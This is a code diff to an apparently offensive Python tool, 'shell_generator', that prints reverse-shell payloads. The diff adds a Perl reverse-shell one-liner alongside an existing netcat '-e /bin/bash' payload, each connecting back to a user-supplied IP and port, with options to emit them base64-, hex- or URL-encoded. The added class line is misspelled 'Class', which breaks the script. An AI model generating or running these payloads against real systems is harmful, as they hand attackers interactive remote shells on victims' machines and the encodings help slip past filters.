@@ -70,6 +70,12 @@ class Netcat(Encode):
         self.__payload = f"nc -vn {self.__ip} {self.__porta} -e \"/bin/bash\""
         super().__init__(self.__payload)
 
+Class Perl(Encode):
+    def __init__(self:object,ip:str,porta:str):
+        self.__ip = ip
+        self.__porta = porta
+        self.__payload = f"perl -e 'use Socket;$i=\"{self.__ip}\";$p={self.__porta};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"sh -i\");};'"
+        super().__init__(self.__payload)
 
 parser = argparse.ArgumentParser(prog=banner(),usage="python3 shell.py -ip 192.168.4.80 -port 4444 -payload bash -encode urlencode")
 parser.add_argument('--version',action='version', version='shell_generator_2.0')
@@ -116,3 +122,12 @@ if __name__ == "__main__":
             print(Netcat(args.ip,args.porta).hexadecimal())
         elif args.encode == "urlencode":
             print(Netcat(args.ip,args.porta).urlencode())
+    elif args.payload == "perl":
+        if args.encode is None:
+            print(Perl(args.ip,args.porta).shell())
+        elif args.encode == "base64":
+            print(Perl(args.ip,args.porta).base64())
+        elif args.encode == "hex":
+            print(Perl(args.ip,args.porta).hexadecimal())
+        elif args.encode == "urlencode":
+            print(Perl(args.ip,args.porta).urlencode())
